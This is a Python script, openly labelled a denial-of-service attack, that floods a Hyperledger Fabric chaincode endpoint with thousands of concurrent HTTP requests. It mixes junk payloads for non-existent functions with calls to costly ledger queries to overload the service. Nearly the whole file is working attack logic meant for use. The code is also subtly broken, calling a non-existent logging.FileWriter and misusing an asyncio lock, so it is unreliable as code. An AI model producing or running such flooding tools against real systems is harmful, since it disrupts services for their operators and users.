import asyncio
import json
import random
import string
import time
import logging
from datetime import datetime
import sys

# You must install aiohttp: pip install aiohttp
import aiohttp

# --- Configuration ---
FABRIC_URL = "http://localhost:7051"  # Replace with your Fabric network's REST API URL
CHANNEL_ID = "mychannel"  # Replace with your channel ID
CHAINCODE_ID = "mycc"  # Replace with your chaincode ID

# Attack parameters
TOTAL_TRANSACTIONS = 5000  # Total number of transactions to send
CONCURRENT_REQUESTS = 500  # Number of concurrent async requests
ATTACK_TIMEOUT_SECONDS = 15  # Timeout for each HTTP request

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileWriter('dos_async_flood.log'),
    ]
)
logger = logging.getLogger(__name__)

# --- Improved Attack Logic ---

# List of non-existent functions to cycle through, making traffic less uniform
INVALID_FUNCTIONS = [
    "invalidDiscardFunction", "doNothing", "processJunk", "executeFake", 
    "handleGarbage", "invokeNonExistent", "triggerError"
]

# List of potentially expensive, valid functions to target (if they exist)
# This is more effective than just invalid functions.
# Example: a query that scans a large state database.
EXPENSIVE_VALID_FUNCTIONS = [
    "queryAllAssets", "getHistoryForKey", "queryWithPagination"
]

def generate_malformed_payload() -> str:
    """
    Generates a varied JSON payload designed to be discarded or be expensive to process.
    """
    # 1. Choose a random invalid function name
    fcn = random.choice(INVALID_FUNCTIONS)
    
    # 2. Create a large random argument
    # This increases network bandwidth and processing overhead
    random_data = ''.join(random.choices(string.ascii_letters + string.digits, k=2048))
    
    # 3. Occasionally, target a valid but expensive function
    if random.random() < 0.2: # 20% chance to target an expensive function
        fcn = random.choice(EXPENSIVE_VALID_FUNCTIONS)
        # Use a valid query argument if needed, e.g., an empty JSON object
        args = [json.dumps({})]
    else:
        args = [random_data]

    return json.dumps({
        "fcn": fcn,
        "args": args
    })

async def send_transaction(session: aiohttp.ClientSession, url: str, stats: dict):
    """
    Sends a single transaction asynchronously.
    """
    try:
        payload = generate_malformed_payload()
        
        async with session.post(url, data=payload, timeout=ATTACK_TIMEOUT_SECONDS) as response:
            # We don't care about the response body, only that the request was sent
            status = response.status
            with stats['lock']:
                stats['sent'] += 1
            logger.info(f"Sent request. Status: {status}")

    except asyncio.TimeoutError:
        with stats['lock']:
            stats['failed'] += 1
        logger.warning("Request timed out.")
    except aiohttp.ClientError as e:
        with stats['lock']:
            stats['failed'] += 1
        logger.warning(f"Request failed: {e}")

async def run_dos_attack():
    """
    Main async function to orchestrate the high-performance DoS attack.
    """
    # --- High-level Console Output ---
    print("="*50)
    print(">>> STARTING HIGH-PERFORMANCE DOS ATTACK (ASYNC) <<<")
    print("="*50)
    print(f"Target URL: {FABRIC_URL}")
    print(f"Target Channel: {CHANNEL_ID}")
    print(f"Target Chaincode: {CHAINCODE_ID}")
    print(f"Total Transactions to Send: {TOTAL_TRANSACTIONS}")
    print(f"Concurrent Requests: {CONCURRENT_REQUESTS}")
    print("-"*50)
    print("Detailed logs are being written to: dos_async_flood.log")
    print("-"*50)

    url = f"{FABRIC_URL}/channels/{CHANNEL_ID}/chaincodes/{CHAINCODE_ID}"
    stats = {'sent': 0, 'failed': 0, 'lock': asyncio.Lock()}
    
    start_time = datetime.now()
    
    # Use a TCPConnector to manage a pool of connections
    connector = aiohttp.TCPConnector(limit=CONCURRENT_REQUESTS, force_close=True)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for i in range(TOTAL_TRANSACTIONS):
            # Create a task for each transaction
            task = asyncio.create_task(send_transaction(session, url, stats))
            tasks.append(task)
            
            # Control the concurrency by not having more than N tasks running at once
            if len(tasks) >= CONCURRENT_REQUESTS:
                # Wait for a batch to complete before adding more
                done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                tasks = list(pending) # Keep the pending tasks for the next batch

        # Wait for any remaining tasks to finish
        if tasks:
            await asyncio.wait(tasks)

    # --- Final Summary ---
    end_time = datetime.now()
    duration = end_time - start_time
    print("\n" + "-"*50)
    print(">>> ALL REQUESTS COMPLETED <<<")
    print(f"Attack finished. Total duration: {duration}")
    print(f"Final Tally - Total Sent: {stats['sent']}, Total Failed: {stats['failed']}")
    print("="*50)
    print(">>> ATTACK FINISHED <<<")
    print("="*50)

if __name__ == "__main__":
    try:
        asyncio.run(run_dos_attack())
    except KeyboardInterrupt:
        print("\n!!! ATTACK INTERRUPTED BY USER !!!")
    except Exception as e:
        print(f"\n!!! UNHANDLED ERROR IN MAIN SCRIPT: {e} !!!")
        logger.error("Unhandled error in main script", exc_info=True)
